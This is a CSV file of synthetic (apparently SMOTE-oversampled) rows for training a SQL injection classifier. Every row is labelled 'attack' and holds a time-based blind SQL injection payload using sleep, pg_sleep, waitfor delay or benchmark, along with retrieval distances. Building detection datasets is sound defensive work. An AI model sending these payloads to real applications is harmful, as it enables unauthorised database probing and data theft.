id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000172,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000047,0.5808519998684402
SMOTE_000173,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000215,0.4563877593133512
SMOTE_000174,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000255,0.012040961955298798
SMOTE_000175,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000173,1.1638544033416622
SMOTE_000176,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",nearest_attack_euclidean,R000077,1.0706035447438513
SMOTE_000177,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000161,0.19845510673861963
SMOTE_000178,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000311,0.3390860318070397
SMOTE_000179,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,1.0468821723283392
SMOTE_000180,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000293,0.037260187372316796
SMOTE_000181,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000126,0.10539429122533257
SMOTE_000182,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,0.8222487863871623
SMOTE_000183,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000224,0.5045586933121169
SMOTE_000184,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000119,0.9960651278433406
SMOTE_000185,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000031,1.236179543979103
SMOTE_000186,attack,time,"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000222,0.5430337835576131
SMOTE_000187,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000045,0.8138146083381765
SMOTE_000188,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000057,0.07743897815130633
SMOTE_000189,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,nearest_attack_euclidean,R000221,0.4937235235677717
SMOTE_000190,attack,time,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000089,0.32520568723931026
SMOTE_000191,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000099,0.012612329758344823
SMOTE_000192,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000022,0.03258566474614434
SMOTE_000193,attack,time,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",nearest_attack_euclidean,R000279,1.448153182442796
SMOTE_000194,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000188,2.3573047591266763
SMOTE_000195,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000100,1.669359945105519
SMOTE_000196,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000184,0.7294118318940183
SMOTE_000197,attack,time,"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000213,0.11818375132456074
SMOTE_000198,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000053,0.36973330232510365
SMOTE_000199,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",nearest_attack_euclidean,R000249,0.3578360156465493
SMOTE_000200,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,0.9595105041806793
